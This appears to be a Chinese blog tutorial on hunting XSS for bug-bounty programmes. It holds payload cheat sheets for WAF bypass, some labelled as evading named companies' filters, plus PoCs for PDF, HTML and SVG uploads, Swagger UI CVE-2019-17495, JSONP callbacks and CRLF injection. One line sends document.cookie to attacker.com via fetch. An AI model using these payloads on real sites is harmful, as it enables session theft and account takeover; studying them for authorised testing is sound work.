---
title: XSS漏洞挖掘
date: '2026-08-08 15:36:16'
tags: []
categories:
  - 漏洞挖掘
slug: XSS漏洞挖掘
permalink: /漏洞挖掘/xss-vuln-hunting
draft: false
---

xss 漏洞挖掘，其实不必多说，咱们学习 web 漏洞，最常见的就是这个 xss 漏洞，可以说，见到框就插。在公益 src，Edusrc，随便插入，一个`<script>alert(1)</script>` 直接就是弹框，弹弹弹，搞了不少 xss，结果等去挖企业 src，直接就碰壁了，一个简单的`<script>`标签就直接给拦截了，发现一个标签就打不动，waf 使劲拦截，搞到最后连是否存在 xss 漏洞都不知道。

**一个小知识点：**
企业 src，callback 是 xss 的重点灾区！


#### 步骤：
先简单探测--->探测成功-->在进行 waf 探测--->成功 body 返回
# 1、XSS原理
用户输入被浏览器当成代码执行 = 服务器输出时未转义,输入进入 HTML 解析流。分为反射性XSS(低危)、DOM型XSS(低危)、存储型(高危)。
# 2、XSS探测
通过`<s> <h1> <p> `标签进行探测
**不带闭合：**
```
<s>123

<h1>123</h1>

<p>123</p>
```
**带闭合：**
```
</tExtArEa><h1>123</h1>#

</tExtArEa><s>123#//--+

'"></tExtArEa><s>123#//--+
```
**常规闭合：**
```text
部分标签可以执行脚本，无需闭合，如div
<div id="body">[输出]</div>

部分标签无法执行脚本，需要闭合，如
<title></title>
<textarea></textarea>
<xmp></xmp>
<iframe></iframe>
```

如果被解析了，接下来就可以尝试制造一些没有危害的弹窗

**弹窗payload：**
```
<script>alert(1)</script>  # 标签体上下文直接打
<img src=x onerror=alert(1)> # 不需要 script 标签,图片加载失败触发,属性上下文常用
<svg onload=alert(1)> # 常能绕过只过滤 script 的 WAF
<details open ontoggle=alert(1)> # 点了才触发/自动触发均可
<script>confirm(1)</script> # alert 被禁用时换 confirm,同样是纯弹窗
```
# 3、XSS绕过
```
大小写绕过
<Script>alert(1);</Script>

双写绕过
<script<script>>alert(1);</sc</script>>

禁用 alert 绕过
<img src="1" onerror="confirm('xss')"> （双引号加不加都行）
<script>confirm(1)</script>
<script>prompt(1)</script>

禁用单引号（要注意数字可以不带单引）
<script>confirm(`xss`)</script>
<script>confirm(/xss/)</script>

过滤括号()
可以使用反单引号来代替
<script>alert`1`</script>

过滤尖括号<>
如果<>被过滤，但是下面的标签里会输出内容，可以通过伪协议绕过
payload=hello' onmouseover='javascript:alert(1)'

空格的替换
空格的 url 编码为：%20
可替换成如下：
%09 %0a %0b %0c %0d %a0 /

单引号的替换
可以将 ' 改成 ` 反引号

编码绕过
<svg%20onload=confir\u006d`1`>
```
# 4、XSS混淆绕过
```
</tExtArEa>'"<a/href="ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Ta
b;:%26Tab;%26Tab;top%26Tab;[8680439..toString(30)]()">click_me</a
>#

<div class=\"media-wrap image-wrap\"><img
src=\"https://img.threatbook.cn/c375eed802260503b4cee1086ea65f0e1
72480015227cf81a82d77.png\" onerror=\"alert`1`\"/></div>

<script%20type="text/javascript">%20var%20reg%20=%20/test/;%20var
%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str)
;%20alert(result);%20</script>
#bypass 百度，阿里巴巴
```
# 5、XSS加密绕过
```
<iframe
src="data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg==">
</iframe>

<iframe
src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2
Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjw
vb2JqZWN0Pg=="></iframe>
#bypass 腾讯

<iframe
src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2
Jhc2U2NCxQR0YxWkdsdklITnlZejB4SUc5dVpYSnliM0k5WTI5dVptbHliU2duZUh
OemMzTW5LVDQ9Pjwvb2JqZWN0Pg=="></iframe>
```
# 6、XSS冷门标签绕过
越冷门越容易过
```
"\"><s>12356789@qq.com # 邮箱 xss(验证)

<sTylE OnLoAd=alert(1)>

<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()%20x>

<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()%20x> #过携程和oppo

22onmouseover=%22a=confirm,a(document.cookie)%22--+//%23 #过oppo

<dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a(document.cookie)%20x>

<svg%20onmouseover%0A=%0Aa=confirm,a(1)>

<svg%0Aonmouseover%0A=%0Aa=confirm,a(1)%20x>

<svg%20onmouseover%0A=%0Aa=confirm,a(document.cookie)>

'+onclick=a=alert,a(1)%2F%2F

'+onclick=a=alert,a(1)--+

'+onclick=a=confirm,a(1)--+

'+onclick=a=confirm,a(1)%2F%2F

%27+onclick='a=alert,a(1)'--+

在对 xss 标签进行注释的时候要使用--+和// ，经测试%23 无效。如果 onload 不能用,就换成其他属性。

<marquee behavior="alternate" onstart=alert(1)>123</marquee>

<MaRQuEe BehAvIor="alternate" onStArt=alert(1)>123</MaRQuEe>

<body onpageshow=alert(1)>

<body onPAgeShoW=confirm(111)>

<details ontoggle=alert()>

向下按钮 xss

<SVg </onLoaD ="1> (_=prompt,_(1)) "">

<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>

<d3"<"/onclick="1>[confirm``]"<">dianwo # 需要点击

<w="/x="y>"/oNCliCk=`<`[confir\u006d``]>dianwo # 需要点击

<w="/x="y>"/ondblclick=`<`[confir\u006d``]>dianwo2 # 需要双击

<w="/x="y>"/oNDblCliCk=`<`[confir\u006d``]>dianwo2 # 需要双击

<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */;

OnError=confirm`1` //>

<img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<object data=javascript:alert(1)>

<svg onload=setInterval`alert\x28document.domain\x29`>

<img src=1
onerror=javascript:{{constructor.constructor('alert(1)')()}}> # 点击一次

<a
href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo<
/a> # 点击一次
```
# 7、文件上传类型XSS

> 原理:不是所有 XSS 都要靠"往参数里塞 payload"。只要能上传**会被浏览器当 HTML/脚本解析的文件**,并且文件能从站点(或同域/CDN)被直接访问,就等于拿到了一个存储型 XSS——谁打开这个文件谁中招。
> 挖洞姿势:找到**文件上传点**(头像、附件、简历、图片上传),上传下面这类文件,然后访问上传后返回的 URL。

## 7.1 PDF XSS

**原理**:PDF 规范支持嵌入 JavaScript,PDF 阅读器打开文档时自动执行(通过 `/OpenAction` 等动作触发)。若站点允许上传 PDF 并在同域直接提供访问,受害者打开恶意 PDF 即触发 XSS。**注意:只有 Adobe Acrobat 插件/完整阅读器会执行 PDF 内嵌 JS,浏览器内置的 PDF 预览器通常不执行,所以影响范围有限——这就是为什么"众测收 500 左右,src 不收"**(众测平台收,企业 SRC 一般不收,因为利用条件苛刻)。

**最小 PoC(手工构造恶意 PDF)**:
```
%PDF-1.4
1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj
2 0 obj << /Type /Action /S /JavaScript /JS (app.alert('XSS')) >> endobj
trailer << /Root 1 0 R >>
%%EOF
```

**实战要点**:
- 上传后务必用浏览器/Acrobat **直接打开文件 URL** 验证(而不是只看上传成功);
- 也可以搜现成的 `xss.pdf` 生成工具直接生成带 JS 的 PDF;
- 判断该不该报:能证明在受害浏览器里执行了脚本才算数,浏览器内置预览器不弹窗就不算。

![PDF XSS 案例截图](/images/20260808155004.png)
![PDF XSS 案例截图 2](/images/20260808155005.png)

## 7.2 Html XSS(存储桶)

**原理**:直接上传一个 `.html` 文件,如果上传点**不做类型校验**,或者文件被存到**对象存储桶(OSS/COS/S3)且桶开启了静态网站托管**,那么访问这个 html 的 URL 时浏览器会**按 HTML 解析并执行里面的 JS**。若文件与主站同域/同源,还能直接读写主站 Cookie,危害等同存储型 XSS。

**PoC(上传 payload.html)**:
```html
<script>alert(document.cookie)</script>
```
或带外数据回传:
```html
<script>fetch('https://attacker.com/exfil?c='+document.cookie)</script>
```

**实战要点**:
- 文件名直接用 `xss.html`、`1.svg` 这种最容易被识别为 HTML/图片的扩展名;
- 存储桶场景注意:桶域名和主站不同源时只算"存储型 XSS 或存储桶接管"级别,报漏洞时写清楚域名关系;
- 看响应 `Content-Type` 是不是 `text/html`,是才能执行脚本(如果被强制为 `application/octet-stream` 就不会执行)。

![Html XSS 存储桶案例](/images/20260808155006.png)
![Html XSS 存储桶案例 2](/images/20260808155007.png)

## 7.3 SVG XSS

**原理**:SVG 是 XML 格式的矢量图,浏览器会**把 SVG 当作独立文档解析**,里面的 `<script>`、`onload` 等事件都会执行。很多站点的图片上传只校验扩展名/Content-Type 是不是图片,**允许 svg 就等于白送一个存储型 XSS**。

**PoC**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(1)</script>
</svg>
```
或极简版(直接当头像上传):
```xml
<svg onload=alert(1)>
```

**实战要点**:
- 头像/图标/富文本编辑器图片上传点优先试 `.svg`;
- 上传后用浏览器直接打开文件 URL,弹窗即证明;
- 服务器校验严格时会做 SVG 净化(过滤 script/事件属性),这时候可以试 `<svg><foreignObject>`、`<use href>` 等冷门写法绕净化。

# 8、Nday XSS

> Nday = 已公开漏洞(1day/nday),直接用公开的 PoC 打,不需要自己挖。适合快速捡漏:很多线上系统**没升级组件**就中招。

## 8.1 swagger XSS

**原理**:Swagger UI 支持通过 `?configUrl=` 参数**加载远程 OpenAPI 配置(JSON)**,并把 JSON 里的字段(title、description 等)当作 HTML 渲染进页面。如果 Swagger UI 版本存在该反射型 XSS 漏洞(CVE-2019-17495,修复版本 3.23.11),攻击者让受害者访问一个构造好的链接,就能在目标域执行脚本。

**触发方式**:
```
https://目标站点/swagger/?configUrl=https://xss.smarpo.com/test.json
```
PDF 里给的现成复现链接:`https://xss.smarpo.com/test.json`(攻击者可控的 JSON)。

**PoC(自己搭一个恶意 JSON)**:
```json
{
  "title": "<style>@import url('https://attacker.com/x.css');</style>",
  "description": "<img src=x onerror=alert(document.domain)>"
}
```
受害者访问 `https://target/swagger/?configUrl=https://attacker.com/swagger-config.json` 即触发。

**实战要点**:
- 先找目标站点的 swagger 入口(`/swagger-ui.html`、`/swagger-ui/`、`/v2/api-docs` 等),直接用上面链接测;
- 打之前先确认版本:`< 3.23.11` 基本都可触发;
- 报漏洞时写明:CVE-2019-17495 + 触发链接。

![swagger XSS 案例](/images/20260808155009.png)
![swagger XSS 案例 2](/images/20260808155010.png)

## 8.2 jsonp 导致的XSS

**原理**:JSONP 接口把 `callback` 参数的值**原样拼进返回的 JS 里**(`callback({...})`),如果没校验 callback 的字符,攻击者可以传入 `alert(1)//` 之类的代码,**让接口返回一段恶意 JS**。更关键的是:`<script src>` 加载 JSONP 不受同源策略限制,攻击者可以在自己页面引用受害站点的 JSONP 接口,在受害站点上下文执行脚本(还能窃取接口返回的数据 → JSONP 劫持)。

**触发方式(浏览器直接访问)**:
```
https://victim.com/api/user?callback=alert(document.cookie)//
```
响应会变成:
```js
alert(document.cookie)//({"name":"xxx"})
```
弹窗即证明 callback 没过滤。

**攻击者页面利用(JSONP 劫持)**:
```html
<script src="https://victim.com/api/user?callback=alert(1)//"></script>
```

**实战要点**:
- 找接口里的 `callback` / `jsoncallback` / `cb` / `jsonp` 参数(参考 PDF:`https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction`);
- 先试无害的:`?callback=alert(1)//`、`?callback=<script>alert(1)</script>`;
- 能弹窗/能读到返回数据 → 报反射型 XSS 或 JSONP 劫持(看是否泄露敏感数据);
- 这就是开头说的"企业 src,callback 是 xss 的重点灾区"。

![jsonp XSS 案例](/images/20260808155011.png)
![jsonp XSS 案例 2](/images/20260808155012.png)
![jsonp XSS 案例 3](/images/20260808155013.png)

# 9、CRLF注入导致的XSS

**原理**:HTTP 协议用 `\r\n`(CRLF)分隔响应头和响应体。如果服务器把用户输入**反射进响应头**(如 Location、Set-Cookie、自定义头),且没过滤 `%0d%0a`(CRLF 的 URL 编码),攻击者就能:
1. **注入响应头**:`Set-Cookie: id=admin` → 会话固定;
2. **响应拆分(Response Splitting)**:在头部注入一个额外的 `\r\n\r\n`,提前结束响应头、伪造响应体 → 直接把 `<script>` 塞进响应体,浏览器解析执行 → XSS。

**PoC(注入 Set-Cookie)**:
```
https://victim.com/redirect?url=/%0a%0dSet-Cookie:%20id=admin
```

**PoC(响应拆分注入 script)**:
```
https://victim.com/page?x=%0a%0d%0a%0d%0a<script>alert('xss')</script>
```

**实战要点**:
- 找**重定向参数**(`?url=`、`?next=`、`?redirect=`)和**会回显到响应头的位置**;
- 先发一个无害的验证响应头注入:`?url=%0d%0aX-Injected: 1`,响应头里出现 `X-Injected` 就证明可控;
- 现代框架/中间件大多默认拦截 CRLF,能打出来的站点说明比较老,直接报高危;
- 注意现代浏览器对响应拆分已经比较免疫,但**响应头注入(Set-Cookie)仍然成立**,漏洞价值不减。

![CRLF 注入案例](/images/20260808155014.png)
![CRLF 注入案例 2](/images/20260808155015.png)

# 10、编辑器链接处XSS

**原理**:富文本编辑器(CKEditor、UEditor、wangEditor 等)的**超链接/图片链接**输入框,通常只是前端校验,后端拿到链接后原样输出到 `<a href="...">` 或标签属性里。如果后端不过滤,就可以闭合引号/标签注入 XSS。这类漏洞**需要用户点击链接**才触发,属于存储型(低交互)XSS。

**常见 payload(按注入位置由浅入深)**:
```
"<script>alert(1)</script>               # 直接闭合属性引号,插入 script
<script>alert(2)</script>
<sc<script>ript>alert(4)</script>         # 双写绕过
<ScRipt>alert(5)</script>                # 大小写混淆绕过
<img src=1 onerror=alert(7)>             # 事件属性
onmouseover='alert(9)'                   # 伪属性注入,鼠标悬停触发
<script>alert(11);</script>
>"'><img src="javascript.:alert(12)">     # 闭合引号+伪协议
>"'><script>alert(13)</script>
<table background='javascript.:alert(14)'></table>
<object type=text/html data='javascript.:alert(15);'></object>
"+alert(16)+"                            # JS 上下文闭合字符串
```

**实战要点**:
- 目标:编辑器里**插入链接/图片**功能,链接地址填 payload,保存后找**前台展示链接的位置**点一下验证;
- `javascript:` 伪协议是重点:`<a href="javascript:alert(1)">点我</a>` 点击即执行;
- 存储型能打管理员后台就算高危——**让管理员触发**是完整利用链(配合 XSS 平台/带外数据回传)。

*
